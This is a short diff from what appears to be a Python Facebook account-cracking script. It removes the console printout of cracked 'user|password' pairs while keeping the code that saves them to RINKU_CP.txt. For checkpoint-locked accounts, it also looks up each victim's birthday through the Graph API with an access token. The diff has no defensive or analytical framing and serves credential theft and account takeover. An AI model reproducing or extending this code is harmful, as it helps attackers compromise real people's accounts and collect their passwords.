@@ -215,7 +215,7 @@ class __xxx__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s[RINKU-CP] %s | %s ' % (M, user, pw))
+                        
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
                         open('RINKU_CP.txt' , 'a').write('%s\n' % wrt)
@@ -226,7 +226,7 @@ class __xxx__:
                         year  = ''
                     except:
                         pass
-                    print('\r%s[RINKU-CP] %s | %s ' % (M, user, pw))
+                    
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
                     open('RINKU_CP.txt' , 'a').write('%s\n' % wrt)
